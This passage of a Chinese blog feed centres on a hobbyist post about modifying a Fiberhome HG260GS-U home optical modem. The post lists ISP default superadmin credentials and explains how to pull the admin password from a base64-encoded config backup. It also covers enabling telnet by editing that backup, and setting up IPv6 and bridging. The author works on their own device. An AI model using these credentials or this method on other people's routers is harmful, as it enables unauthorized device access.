DNS域名解析申请使用-免费DDNS、IPv6 地址和Slave DNS</a></p><p><a href="https://www.uulucky.com/show-224057.html" target="_blank" rel="noopener">申请 HE.NET IPv6 隧道以使主机支持 IPv6</a>  </p><p><a href="https://www.yorkchou.com/servarica.html" target="_blank" rel="noopener">Servarica IPv6 Only VPS折腾体验</a></p><p><a href="https://www.bobobk.com/377.html" target="_blank" rel="noopener">如何给阿里云ecs开启ipv6访问</a></p><p><a href="http://www.yaocheap.com/phptec/817.html" target="_blank" rel="noopener">阿里云centos6.8开启ipv6通过appstore审核的方法</a></p><p><a href="https://www.cnblogs.com/gscq073240/articles/7677345.html" target="_blank" rel="noopener">阿里云服务器以及CDN支持IPV6的方法</a></p><p><a href="https://forums.he.net/index.php?topic=1994.msg11842#msg11842" target="_blank" rel="noopener">Dyn-compliant Endpoint Updates</a></p><p>etc.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Web </tag>
            
            <tag> IPv6 </tag>
            
            <tag> Configuration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>光猫折腾记 | 获取超级管理员密码&amp;开启telnet&amp;IPv6&amp;桥接宽带</title>
      <link href="/2020/02/27/Server_OpticalModem/"/>
      <url>/2020/02/27/Server_OpticalModem/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近觉得家里的网速有点慢，上着网课或者看着视频，WiFi 连接的设备同时在用的话就开始卡了 emmm就很难受。🙁</p><p>然后又听说三大运营商的宽带差不多都分配 IPv6 了，手机的话联通流量分配 IPv6 地址也有一段时间了，开热点还能下发 IPv6 到其他设备（然鹅我这里的移动好像还没有）。</p><p>于是就想折腾一下家里的光猫/路由器，反正就是瞎折腾吧。</p><p>这个光猫是有点年纪的 <strong>HG260GS-U</strong>，烽火家的。 硬件版本 <strong>BCM.V2.0</strong> ，软件版本 <strong>G00Y1.00M0001</strong> 。</p><p>大概的内容就是——</p><p>获取了超级管理员密码，开启了 Telnet 管理，启用了 IPv6，并尝试了宽带桥接的改造等等。</p><br><hr><h2 id="0x01-获取超级管理员密码"><a href="#0x01-获取超级管理员密码" class="headerlink" title="0x01 获取超级管理员密码"></a>0x01 获取超级管理员密码</h2><p>通过光猫的管理地址连接到管理页面，一般是 <code>192.168.1.1</code>。登录界面如下。</p><p><img src="/2020/02/27/Server_OpticalModem/login.png" alt="login"></p><p>光猫背面有一个 user 用户的信息，登录之后的界面功能贼少，只能看一下连接状态，设置一下WIFI、静态路由之类的基础配置，连宽带连接都设置不了。</p><p>于是想到通过超级管理员进行登录。</p><p>在网上搜了各种通用密码，比如用户名、密码分别为</p><blockquote><p>CUAdmin  CUAdmin</p><p>telecomadmin  nE7jA%5m</p><p>CMCCadmin  aDm8H%MdA</p><p>fiberhomehg2x0  hg2x0  （工程账号）</p></blockquote><p>有可能登录是这个网址：<a href="http://192.168.1.1/cu.html" target="_blank" rel="noopener">http://192.168.1.1/cu.html</a></p><p><strong>然而都没有用！</strong></p><p>哦对了，这个工程账号（据说是隐藏用户）这样开启：</p><p>访问 <a href="http://192.168.1.1/logoffaccount.html" target="_blank" rel="noopener">http://192.168.1.1/logoffaccount.html</a> ，将<strong>隐藏用户</strong>设置为<strong>启用</strong>，而后点击<strong>保存/应用</strong>即可。</p><p><img src="/2020/02/27/Server_OpticalModem/hidden_user.png" alt="hidden_user"></p><p><strong><em>（然而我这里没用</em></strong></p><p>于是看了看网上大佬们的骚操作，发现可以通过<strong>备份设置</strong>的办法获取到超级管理员账号及密码。</p><h3 id="Step-1-以普通用户身份登录光猫"><a href="#Step-1-以普通用户身份登录光猫" class="headerlink" title="Step 1 以普通用户身份登录光猫"></a>Step 1 以普通用户身份登录光猫</h3><p>就是光猫背后的那个用户名密码啦。</p><h3 id="Step-2-下载设置备份文件"><a href="#Step-2-下载设置备份文件" class="headerlink" title="Step 2 下载设置备份文件"></a>Step 2 下载设置备份文件</h3><p>访问 <a href="http://192.168.1.1/backupsettings.conf" target="_blank" rel="noopener">http://192.168.1.1/backupsettings.conf</a> ，下载配置文件<code>backupsettings.conf</code>。</p><p>注意一定要在登陆后才下载，否则下载得到的文件并没有配置信息，而是一个让你登录界面的 HTML 文件。</p><p><img src="/2020/02/27/Server_OpticalModem/backupsettings_error.png" alt="错误示范"></p><p>正确的文件是一个xml文本，例如下面这样的。</p><p><img src="/2020/02/27/Server_OpticalModem/backupsettings.png" alt="正确示范"></p><p>可以发现里面保存了所有的配置信息，WAN连接、LAN连接、WiFi及WPS、宽带信息、Loid等等都有，当然，超级用户信息也在。</p><p>而且这个文件没有（明显的）加密，最多只是用了个<code>base64</code>。</p><p><img src="/2020/02/27/Server_OpticalModem/superadmin.png" alt="超级用户"></p><p>超级管理员用户就在<code>DeviceInfo</code>下的<code>X_CMCC_TeleComAccount</code>里。</p><p><strong>用户名为<code>admin</code></strong>，<strong>密码</strong>通过<code>base64</code>解码可以得到为<code>Cmcc10086#</code>。</p><p>（By the way，user用户的密码在这里啦↓</p><p><img src="/2020/02/27/Server_OpticalModem/userinfo.png" alt="user信息"></p><h3 id="Step3-登录试试"><a href="#Step3-登录试试" class="headerlink" title="Step3 登录试试"></a>Step3 登录试试</h3><p>成功登录，界面比user功能多得多了，可以配置宽带信息、VLAN、USB存储远程下载等等了。</p><p><img src="/2020/02/27/Server_OpticalModem/login_main.png" alt="登陆后的界面"></p><br><hr><h2 id="0x02-开启-Telnet-管理"><a href="#0x02-开启-Telnet-管理" class="headerlink" title="0x02 开启 Telnet 管理"></a>0x02 开启 Telnet 管理</h2><p>按理说是可以利用工程账号进去开启 Telnet 的，然而我也不知道为啥进不去emmm</p><p>找个网上的图↓</p><p><img src="/2020/02/27/Server_OpticalModem/telnet_enable_web.png" alt="开启telnet"></p><p>那就*<em>直接改配置文件好吧 *</em>233333</p><h3 id="Step-1-修改配置文件"><a href="#Step-1-修改配置文件" class="headerlink" title="Step 1 修改配置文件"></a>Step 1 修改配置文件</h3><p>首先<strong>备份一份上面下载的配置文件</strong>（改错了还可以恢复嘛），而后搜索<code>telnet</code>，<strong>把它设为<code>TRUE</code>。</strong></p><p><strong>注意大小写呀！</strong></p><p>当然如果想要开启 FTP 的话可以顺便开启一下hhh。</p><p><img src="/2020/02/27/Server_OpticalModem/telnet_enable.png" alt="开启telnet"></p><h3 id="Step-2-上传配置文件"><a href="#Step-2-上传配置文件" class="headerlink" title="Step 2 上传配置文件"></a>Step 2 上传配置文件</h3><p>访问<strong>更新路由器配置</strong>的页面 <a href="http://192.168.1.1/updatesettings.html" target="_blank" rel="noopener">http://192.168.1.1/updatesettings.html</a></p><p>（可能需要登录）</p><p><img src="/2020/02/27/Server_OpticalModem/updatesettings.png" alt="updatesettings"></p><p>选择修改后的配置文件，点击 <strong>更新配置</strong>。</p><h3 id="Step-3-重启光猫"><a href="#Step-3-重启光猫" class="headerlink" title="Step 3 重启光猫"></a>Step 3 重启光猫</h3><p>（如果没有自动重启的话</p><p>可以选择在 <strong>管理-设备管理-设备重启</strong> 里重启，当然也可以直接关掉电源再打开233。怎么喜欢怎么来。</p><p><img src="/2020/02/27/Server_OpticalModem/reboot.png" alt="reboot"></p><h3 id="Step4-telnet-连接光猫"><a href="#Step4-telnet-连接光猫" class="headerlink" title="Step4 telnet 连接光猫"></a>Step4 telnet 连接光猫</h3><p>而后就可以通过 telnet 连接到你的光猫了。</p><p><strong>用户名和密码都是<code>admin</code>。</strong></p><p><img src="/2020/02/27/Server_OpticalModem/telnet.png" alt="telnet"></p><p>它用的是 <strong>BCM96838</strong> 这个芯片。<em>（感兴趣可以搜一搜</em></p><p>发现它并没有 cd 这个command。</p><pre><code> &gt; help?helplogoutexitquitrebootbrctlcatvirtualserverddnsdfloglevellogdestdumpcfgdumpmdmdumpeidmdmmeminfopspkilldumpsysinfodnsproxysyslogechoifconfigpingpspwdsntpsysinfotftpwlctlshowOmciStatslaseromciomcipmdumpOmciVoicedumpOmciEnetdumpOmciGemlaserarpdefaultgatewaydhcpserverdnslanlanhostspasswdppprestoredefaultroutesaveswversionuptimecfgupdateswupdateexitOnIdlewansetgetgendefsettingsloaddefsettingscheckdefsettingscomposenewsettingscreate_merge_presettingtransform_presettingupgradeledctlusbtestlsfacmodesimcardvoipteststartvoiptestendvoice_testphone_connectrecordpcmstartrecordpcmendStartCallStopCallStartRingStopRingPlayCNGToneStopCNGTonePlayDTMFTonefhvoiceredirectmcpctlitmswificard</code></pre><p>不过好像功能也不少的亚子。</p><p>看了一下存储。</p><p><img src="/2020/02/27/Server_OpticalModem/df.png" alt="df"></p><p>内存。</p><p><img src="/2020/02/27/Server_OpticalModem/meminfo.png" alt="meminfo"></p><p>然后发现有一个<strong>隐藏的<code>sh</code>指令</strong>，可以支持大部分的 Linux 指令啦~</p><p>看了一下系统信息。</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># uname -a</span>Linux <span class="token punctuation">(</span>none<span class="token punctuation">)</span> 3.4.11-rt19 <span class="token comment" spellcheck="true">#3 SMP PREEMPT Mon Jul 4 19:17:02 CST 2016 mips GNU/Linux</span></code></pre><p>webs 目录下为所有的前端网页的文件。</p><p><img src="/2020/02/27/Server_OpticalModem/sh.png" alt="sh"></p><pre><code>FHFactoryCheck.html                  ipsec.htmlFH_Simple_CloseHideWeb.html          ipsecview.htmlFH_Simple_FactoryRestore.html        ipv6lancfg.htmlFH_Simple_OpenHideWeb.html           itms_right.htmlStaticIpAdd.html                     itms_wrong.htmlStaticIpErr.html                     itmsuploadfinish.htmlareacode.js                          itmsuploadfinish_guangdong.htmlbackupsettings.html                  itmsuploadingimage.htmlbuildinfo.html                       itmsuploadingimage_guangdong.htmlcertadd.html                         itmsuploadreboot.htmlcertcaimport.html                    jquery.jscertcaview.html                      lanvlancfg.htmlcertimport.html                      lockerror.htmlcertloadsigned.html                  logconfig.htmlcertlocalview.html                   login.htmlcertreqshow.html                     loginerror.htmlcertshow.html                        logintro.htmlcfgepon.html                         logo.htmlcfgeth.html                          logoffaccount.htmlcfggpon.html                         logout.htmlcodepassword.html                    logview.htmlcolors.css                           macstudy.htmlctExternalApInfo_user.html           main.htmlctExternalApInfooffline.html         mainCT.htmlctStaticIpAdd.html                   menuCT.jsctTracerouteresult.html              menuTitle.jsctalgcfg.html                        menuTree.jsctdhcpcfg.html                       multicast.htmlctdhcpdevice.html                    password.htmlctdiag.html                          picctdiag_ping.html                     platconfig.htmlctdiag_tracert.html                  portName.jsctdiagmng.html                       portalmngr.htmlctdiagsystem.html                    portmap.htmlctdiagxPon.html                      portmapadd.htmlctdms.html                           portmapedit.htmlctdnsconfig.html                     pradd.htmlcteponinterfaceinfo.html             prmngr.htmlctexternalApInfo.html                pswdadmin.htmlctgponinterfaceinfo.html             pswduser.htmlctigmpproxy.html                     qoscls.htmlctigmpsnooping.html                  qosclsedit.htmlctinfo.html                          qosclsview.htmlctinfo_fujian.html                   qosqmgmt.htmlctipflt.html                         qosqueue.htmlctipfltblack.html                    qosqueueadd.htmlctipfltwhite.html                    qosview.htmlctlanbind.html                       rebootinfo.htmlctlogconfig.html                     redirect.htmlctlogflashview.html                  redirect_cardoffline.htmlctlogintro.html                      redirect_portal.htmlctlogview.html                       redirect_portal_confirm.htmlctloid.html                          redirect_uploadimage.htmlctmacflt.html                        register.htmlctmacpolicy.html                     register_anhui.htmlctmldproxy.html                      register_fail.htmlctmldsnooping.html                   register_fujian.htmlctmulticastvlan.html                 register_guangdong.htmlctpingresult.html                    register_guangdong_fail.htmlctpswdrelogin.html                   register_hainan.htmlctroute6add.html                     register_ing.htmlctstatslan.html                      register_ing_anhui.htmlctstatslan_user.html                 register_ing_card.htmlctusererror.html                     register_ing_fujian.htmlctuserpswd.html                      register_ing_guangdong.htmlctwan_ethinfo.html                   register_ing_guangdong_1.htmlctwanconfig.html                     register_ing_guangdong_refresh.htmlctwanconfig_user.html                register_ing_hainan.htmlctwaninfo.html                       register_ing_iframe.htmlctwaninfo6.html                      register_ing_iframe_refresh.htmlctwaninfo6_user.html                 register_ing_iframe_refresh_1.htmlctwaninfo_user.html                  register_ing_sichuan.htmlctwaninfoall.html                    register_limit.htmlctwaninfoallv6.html                  register_loid.htmlctwlanInfo.html                      register_restore.htmlctwlanInfo_user.html                 register_restore_remote.htmlctwlcfg.html                         register_restore_retry.htmlctwlsecurity.html                    register_restore_retry_sichuan.htmlddnsadd.html                         register_restore_sichuan.htmldefaultsettings.html                 register_restoreinfo.htmldhcpinfo.html                        register_sichuan.htmldiaginform.html                      registered_chongqing.htmldnscfg.html                          registered_fujian.htmldnsproxycfg.html                     registered_guangdong.htmldosprotect.html                      registered_hunan.htmldownloadFile.html                    resetrouter.htmlenableipv6.html                      restoreinfo.htmlengdebug.html                        restoresettings.htmleponadderr.html                      restrain.htmlepondelerr.html                      ripcfg.htmlethadderr.html                       routeadd.htmlethdelerr.html                       routetbl.htmlexporting.js                         rtdefaultcfg.htmlexternalapcfg.html                   rtdefaultcfgerr.htmlexternalapcfgoffline.html            rtroutecfg.htmlexternalapsecurity.html              scdmz.htmlexternalapsecurityoffline.html       scinflt.htmlfactorymode.html                     scinfltview.htmlfbctwanconfig.html                   scmacflt.htmlfhvoiceh248dsp.html                  scmacfltview.htmlfhvoiceh248mgc.html                  scmacpolicy.htmlfhvoiceh248ngn.html                  scoutflt.htmlfhvoiceh248port.html                 scoutfltview.htmlfhvoiceprotocol.html                 scvrtsrv.htmlfhvoicesettings.html                 servmngr.htmlfhvoicesipadvance.html               simcardoffline.htmlfhvoicesipbasic.html                 sipregstatus.htmlfhvoicesipdigitmap.html              sipteleview.htmlfhvoicesipfax.html                   sntpcfg.htmlfhvoicesipuserline.html              speed.htmlfirewall.html                        statsifc.htmlfooter.html                          statsifcreset.htmlftpcfg.html                          statswan.htmlgponadderr.html                      statswanreset.htmlgpondelerr.html                      storageusraccadd.htmlhelp_manage_device.html              stylemain.csshelp_manage_file.html                stylesCT.csshelp_manage_keep.html                surprise.htmlhelp_manage_user.html                todadd.htmlhelp_net_QOS.html                    todmngrview.htmlhelp_net_WLAN.html                   tr69cfg.htmlhelp_net_dhcp.html                   tr69cfgview.htmlhelp_net_externalap.html             tr69connect.htmlhelp_net_network.html                traffictl.htmlhelp_net_remote.html                 traffictladd.htmlhelp_net_route.html                  updatesettings.htmlhelp_net_time.html                   upload.htmlhelp_net_voice.html                  upload_chongqing.htmlhelp_net_voip.html                   uploadinfo.htmlhelp_safe_firewall.html              upnpcfg.htmlhelp_safe_mac.html                   url_add.htmlhelp_safe_port.html                  urlfilter.htmlhelp_safe_wan.html                   urlfilterErr.htmlhelp_status_device.html              usbbackup.htmlhelp_status_net.html                 usbbackuphandle.htmlhelp_status_remote.html              usbbackupresult.htmlhelp_status_user.html                usbinfo.htmlhelp_status_voip.html                usbxdown.htmlhelp_use_IGMP.html                   util.jshelp_use_MLD.html                    wlcfg.htmlhelp_use_UPNP.html                   wlcfg_jiangsu.htmlhelp_use_VOIP.html                   wlcfg_zhejiang.htmlhelp_use_device.html                 wlcfg_zhejiang_user.htmlhelp_use_dns.html                    wlcfgadv.htmlhelp_use_nat.html                    wlrefresh.htmlhelp_use_usual.html                  wlsecurity.htmlhighcharts.js                        wlsecurity_jiangsu.htmlhlpethconn.html                      wlsecurity_zhejiang.htmlhlpwlconn.html                       wlsecurity_zhejiang_user.htmlindex.html                           wlshared.htmlipsconfig.html                       wlwapias.html</code></pre><p>然后还可以发现之前的配置文件在 <code>/fhconf/backpresettings.conf</code>。</p><p>日志文件在<code>/fhlog/messages</code> 。</p><p><code>/rom/etc/wlan</code> 目录下好像有一些网卡芯片的驱动（？</p><p><img src="/2020/02/27/Server_OpticalModem/rombin.png" alt="rom"></p><p>然后在某个目录下找到了各种默认配置文件emmm</p><p><img src="/2020/02/27/Server_OpticalModem/default_settings.png" alt="default_settings"></p><p>其他的后面再慢慢玩吧（</p><p>还有提醒一下，<strong>telnet 不用的话最好还是关掉</strong>吧，防止别人连上光猫改了你的配置就不好了呢。</p><br><hr><h2 id="0x03-再看光猫参数-amp-测速"><a href="#0x03-再看光猫参数-amp-测速" class="headerlink" title="0x03 再看光猫参数 &amp; 测速"></a>0x03 再看光猫参数 &amp; 测速</h2><h3 id="光猫参数"><a href="#光猫参数" class="headerlink" title="光猫参数"></a>光猫参数</h3><p>上网搜了一下这个光猫的参数。（可能有所区别）</p><blockquote><p>烽火HG260GS-U</p><p>产品特点   </p><ul><li>支持GPON接口，4FE+2POTS，LAN1口=1G LAN 2.3.4口=100M  </li><li>支持路由/桥混合转发。  </li><li>支持VLAN连接。   </li><li>提供2.4GHz 802.11b/g/n无线接入功能，最高速率可达270Mbps，覆盖范围30m~100m。   </li><li>支持SIP/MGCP/H.248等VOIP协议语音，支持多种语音编码器。   </li><li>强大的QoS能力，保障多业务环境下的VoIP、IPTV等关键业务的服务质量。   </li><li>支持TR-069远程管理：设备配置、版本升级、诊断等。   </li><li>支持WPS。   </li><li>支持Web方式，用户本地管理功能。   </li><li>支持多SSID，提供多个虚拟无线网络。   </li><li>支持VPN穿越 ，基于IPSec/L2TP。   </li><li>支持IPv4/v6,TCP/UDP协议，支持IPv6开启DS-lite和双栈功能。   </li><li>芯片集成度高，功耗小，性能稳定。   </li></ul></blockquote><p>哇呜，它是<strong>支持千兆</strong>的啊！</p><p>不过<strong>只有1口支持1Gbps，其他都是100Mbps的</strong>emmm </p><p>于是直接用网线连接光猫测了一下，果然是这样。</p><p>之前都没注意这个问题唉！是不是因为这个问题影响了网速啊啊啊啊嘤嘤嘤。<em>（其实我也不知道我家宽带有多少带宽）</em></p><p>来测个速看看好了。</p><h3 id="测速"><a href="#测速" class="headerlink" title="测速"></a>测速</h3><p>这是 <strong>连接 WiFi</strong> 的测速结果↓。</p><p><img src="/2020/02/27/Server_OpticalModem/speedtest1.png" alt="WiFi测速"></p><p>通过<strong>网线直连到除1口外的任意一个 LAN 口</strong>，再次测速。</p><p><img src="/2020/02/27/Server_OpticalModem/speedtest2.png" alt="LAN2-4测速"></p><p>差不多跑满100Mbps的带宽了。</p><p>那再来看看 <strong>LAN1 的千兆口</strong>吧。</p><p><img src="/2020/02/27/Server_OpticalModem/speedtest3.png" alt="LAN1测速"></p><p>？？？</p><p>你在逗我嘛？！哇呜原来有差不多150Mbps的啊！</p><p>原来<strong>受限于 LAN 口的带宽</strong>啊！</p><p>气死我了，连接WiFi的话只有差不多1/3的速度啊，草（一种植物）。</p><p>然后把之前连在光猫后的无线路由器接到了 LAN1 口，再登上路由器一看，原来它也只支持百兆带宽emmm</p><p><img src="/2020/02/27/Server_OpticalModem/router.png" alt="router"></p><p>不过怎么说好呢，毕竟这光猫和路由器都有些年纪了，那时候千兆还没普及呢，可能用的才是10M/50M最多也不超过100M的宽带呢。</p><p>所以光猫有一个千兆口也很不错了呢233333.（摊手.gif</p><h3 id="网线的讲究"><a href="#网线的讲究" class="headerlink" title="网线的讲究"></a>网线的讲究</h3><p>噢对了，还有一个好玩的事。。。</p><p>要用上千兆以太网，不仅需要<strong>光猫、路由器支持</strong>，还要你自己的<strong>设备支持</strong>，如果有线连接的话网线还至少要<strong>超五类线</strong>。</p><p>但是还要注意<strong>距离限制</strong>，超过一定的距离（如100m）也不行了，类别越高传输的频率越高则允许的距离就越小。（啊大佬你用光纤？打扰了。</p><p>我用网线连接的时候，最开始用的是一根比较老的 CAT-5e（超五类）线，可能是端口接触不大好或者线路老化的原因吧，实际网卡只协商到了100Mbps。换了一根新的网线（好像也是CAT-5e）就有1Gbps了。</p><p>然而，这根网线不够长，我用连接器把两根都能通千兆的网线连一起再连到电脑，这时网口又协商到100Mbps了emmm</p><p>看来这个网线抗干扰能力不大行呀，千兆网的有线传输要求还是挺严格的。</p><p>不过现在用的基本就<strong>六类线以上</strong>了吧，买网线还有装修布线什么的时候要注意一下这个问题。</p><p>还有买网线<strong>不要买扁的那种</strong>，剖面圆形那种就好。（感觉算是<strong>传输线理论</strong>？</p><br><hr><h2 id="0x04-启用-IPv6"><a href="#0x04-启用-IPv6" class="headerlink" title="0x04 启用 IPv6"></a>0x04 启用 IPv6</h2><p>前面看光猫的参数，发现支持 IPv6 唉！</p><p>听说三大运营商的宽带基本部署 IPv6 了，不过估计设置里没开启，本地也没有分配公网地址，这次就来折腾一下吧。</p><blockquote><p>先说一下，我自己对IPv6这一块都不大了解，这也是第一次尝试设置这个。</p><p>包括前缀分配什么的我都不清楚，所以这里的说法有可能存在错误，<strong>大佬们看到的话欢迎和我交流呀！</strong></p></blockquote><h3 id="Step-1-以超级管理员身份登录光猫"><a href="#Step-1-以超级管理员身份登录光猫" class="headerlink" title="Step 1 以超级管理员身份登录光猫"></a>Step 1 以超级管理员身份登录光猫</h3><p>用上面获取的用户名密码登录。</p><p>在设置前，查看<strong>状态-网络侧信息-IPv6 连接信息</strong>，应该是空的。而 <strong>IPv4 连接信息</strong>里有一个连接的描述里是带有<code>INTERNET</code>的。</p><p>（假装这里有截图）</p><h3 id="Step-2-获取当前设置的参数"><a href="#Step-2-获取当前设置的参数" class="headerlink" title="Step 2 获取当前设置的参数"></a>Step 2 获取当前设置的参数</h3><p>首先在<strong>连接名称</strong>里选择带有<code>INTERNET</code>的选项，然后<strong>把这一页截个图或者拍照备份一下</strong>。（重要）</p><p>最好也备份一下设置文件（同 0x01）！</p><p>这里面的VLAN ID、MTU是后面的依据。</p><h3 id="Step-3-新建宽带连接"><a href="#Step-3-新建宽带连接" class="headerlink" title="Step 3 新建宽带连接"></a>Step 3 新建宽带连接</h3><p>这里前提是<strong>知道宽带的密码</strong>，如果不知道的话，可以在 <strong>0x01</strong> 中获取到的备份文件里找到嘿嘿嘿（仅做了base64加密）。</p><p>新建一个WAN连接，<strong>模式选择<code>Route</code>（路由），协议模式选择<code>IPv4 &amp; IPv6</code>（这就是目的所在喵！）。</strong></p><p>选<code>PPPoE</code>，MTU里填上一步骤的参数；勾选<strong>启用Vlan</strong>，<strong>Vlan ID填上一步参数</strong>。</p><p><strong>IPv6地址分配机制</strong>的话，我这里<strong>自动获取</strong>和<strong>DHCPv6</strong>都行，不过建议选自动获取吧。。。<em>（不大清楚</em></p><p>获取前缀勾上吧，好像可以靠这个下发IPv6.<em>（？</em></p><p>服务模式选择<code>INTERNET</code>。</p><p>绑定端口就是你想要通过这个WAN进行连接网络的端口，如果不清楚的话全勾上就行了。如果有IPTV的话注意不要勾对应的端口。当然有其他需求的自己再考虑。它这里注明了的。</p><blockquote><p>注: WAN连接之间不能共享绑定端口，最后绑定端口的WAN连接绑定操作将冲掉之前其它WAN连接对该端口的绑定操作！</p></blockquote><p>大概的界面类似于这样的。不同设备大同小异的啦。</p><p><img src="/2020/02/27/Server_OpticalModem/IPv6_Config.png" alt="IPv6_Config"></p><p>而后点击<strong>保存/应用</strong>。</p><h3 id="Step-4-IPv6-DHCP-配置"><a href="#Step-4-IPv6-DHCP-配置" class="headerlink" title="Step 4 IPv6 DHCP 配置"></a>Step 4 IPv6 DHCP 配置</h3><p><em>（这一块其实我也不大清楚emmm</em></p><p>大概是这样吧</p><p><img src="/2020/02/27/Server_OpticalModem/IPv6_DHCPConfig.png" alt="IPv6_DHCPConfig"></p><p>貌似DHCPv6是私网，Radvd是利用获取的前缀下发公网的地址。</p><p>网上大概这么说的↓。</p><blockquote><p>在IPV6的自动配置中，分为两种技术<br>一种是传统的有状态(stateful),典型代表就是与IPv4时代相对应的DHCPv6，<br>一种是IPv6的无状态(stateless)自动配置，典型代表是Radvd。这是IPv6协议的一个突出特点:支持网络节点的地址自动配置。    </p><p>在无状态地址自动配置方式下，网络接口接收路由器宣告的全局地址前缀，再结合接口ID得到一个可聚集全局单播地址。在有状态地址自动配置的方式下，主要采用动态主机配置协议（DHCP），需要配备专门的DHCP服务器，网络接口通过客户机/服务器模式从DHCP服务器处得到地址配置信息。  </p><p>具体来说，以RADVD为代表的无状态自动配置不需要消耗很多机器资源，也不像传统DHCP一样需要维护一个本地数据库来维护地址分配状态，他只是进行广播前缀地址，客户端收到这种广播后再自己使用EUI64算法生成全球唯一的IPv6地址，进行自我配置。   </p></blockquote><p>还有</p><blockquote><p>&lt;1&gt;radvd用于无状态自动配置地址，客户端通过网络接口接收路由器宣告的全局地址前缀，再结合接口ID形成全球单播地址，但是这种配置不能获取DNS。</p><p>&lt;2&gt;dhcpv6用于有状态自动配置地址，类似于ipv4的dhcp，客户端从服务器的地址池中配置地址，可获取到DNS。</p></blockquote><p>（然后应该还要配置一下 <strong>IPv6 DNS Proxy</strong>，<em>这个我也不大清楚emmm</em></p><h3 id="Step-5-确认连接状态"><a href="#Step-5-确认连接状态" class="headerlink" title="Step 5 确认连接状态"></a>Step 5 确认连接状态</h3><p>返回到<strong>状态-网络侧信息</strong>，分别看看IPv4和v6的连接信息。留意协议中带有IPv4&amp;IPv6的状态。</p><p>刚开始可能连不上，过一段时间就连上了。</p><p>如果还连不上的话，将之前带有 <code>INTERNET</code> 的那个WAN连接给禁用或删除就好了。</p><p>（不过如果有个TR069那个运营商配置下发的就自己看着办了，删了可以不受运营商进行配置下发和上报，有影响的话新建一个或者修改上一步的服务模式就好了。</p><p>到这里我惊喜地发现，貌似<strong>账号支持多播</strong>唉！不过这个光猫里自然不支持<strong>多播叠加</strong>的了。可以使用桥接宽带让后面的路由器做处理啦。（后面再说）</p><p>于是尝试了一下成功连了两个，其中绑定端口设置成不一样的。不过不知道最多可以几播hhh。</p><p><img src="/2020/02/27/Server_OpticalModem/IPv4_ConnectInfo.png" alt="IPv4_ConnectInfo"></p><p><img src="/2020/02/27/Server_OpticalModem/IPv6_ConnectInfo.png" alt="IPv6_ConnectInfo"></p><p>连接光猫是可以下发 IPv6 公网地址的。</p><p><img src="/2020/02/27/Server_OpticalModem/IPv6_ConnectInfo2.png" alt="IPv6_ConnectInfo2"></p><p>然后发现那个外接的无线路由器也不支持 IPv6，气死了<em>（后面换一个</em></p><p>不过也有<strong>解决方案</strong>的，就是把网线连接到无线路由器的<strong>LAN口</strong>而不是WAN口，关闭它的 DHCP 功能，由光猫直接分配 IP 地址就行了。</p><p><br><br></p><p>然而有个大问题，就是我的 IPv6 没有Internet访问权限。手动配置了DNS也不行。</p><p><code>ping -6 ipv6.baidu.com</code>通不了。</p><p><code>tracert 240c::6666</code> 发现到我的光猫就出不去了。</p><p>试了一下在光猫上的诊断里用IPv6进行ping也没有连接。</p><p>不知道哪里设置有问题了，很懵（摊手。</p><p><strong>求大佬们指点一下。</strong></p><br><hr><h2 id="0x05-宽带桥接改造"><a href="#0x05-宽带桥接改造" class="headerlink" title="0x05 宽带桥接改造"></a>0x05 宽带桥接改造</h2><p>前面说支持多播嘛，然后就想到利用光猫桥接宽带，然后再利用后面的路由器（软路由/硬路由）进行拨号。</p><p>或者是这种情况，网络流量较大，路由较复杂等光猫难以承受或者不够稳定，也可以试试桥接的方案。</p><p>方法类似于 <strong>0x04</strong>。</p><p>大概就像图里这样吧。</p><p>勾选<strong>启用Vlan</strong>，<code>VLAN ID</code> 也和之前配置<code>INTERNET</code>的一样。</p><p><strong>绑定端口建议选端口1</strong>，毕竟是千兆口嘛！</p><p><img src="/2020/02/27/Server_OpticalModem/bridge.png" alt="桥接设置"></p><p>之后就可以直接通过 LAN1 连接路由器或者电脑进行拨号了。</p><p>拨号后也会分配公网的 IPv6 地址。<em>（然而我这里的 IPv6 还是没有Internet访问权限，估计是运营商的问题吧</em></p><p>（假装这里有截图）</p><p>当然，要实现桥接改造，你还可以尝试<strong>直接修改配置文件</strong>的方案<em>（超硬核）</em>，具体请参考<a href="https://guanggai.org/thread-459-1-1.html" target="_blank" rel="noopener">这里</a>。</p><br><hr><h2 id="0x06-其他玩意"><a href="#0x06-其他玩意" class="headerlink" title="0x06 其他玩意"></a>0x06 其他玩意</h2><p>有次在访问一个光猫的页面时输错了网址，正好发现了光猫用的 HTTP Server 是 micro_httpd。</p><p>发现指向的网站还能访问。这是个轻量级的服务器了，正好也适合在这种小设备上跑了。</p><p><img src="/2020/02/27/Server_OpticalModem/404NotFound.png" alt="404"></p><p><img src="/2020/02/27/Server_OpticalModem/acme.png" alt="micro_httpd"></p><p>这个光猫还支持远程下载，可以通过 USB 连接外部设备，开启 FTP 服务器进行访问。</p><p>不过感觉这个 USB 应该也是2.0的，勉强用用还可以吧，也没尝试过233.</p><br><hr><h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><p>折腾了好久这个有点古老的光猫 emmm嘤嘤嘤</p><p>于是乎本文介绍的内容包括：</p><p>通过配置备份文件获取超级管理员密码，开启 Telnet 管理，启用 IPv6，宽带桥接的改造等等。</p><p><em>是时候换个路由器了，只有大概1/3的网速太亏了！</em></p><p>怎么说好呢，感觉其实并没有干什么正事的亚子。。。</p><p>等我学完通信网络（计算机网络）说不定会有更深入的理解吧233333.</p><p><strong>欢迎大佬们来交流交流呢！</strong></p><p>还有，以上内容<strong>仅供学习研究，请在合理合法范围内使用，禁止商用。</strong></p><p><strong>转载记得注明出处呀！</strong></p><p>溜了溜了（</p><br><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a 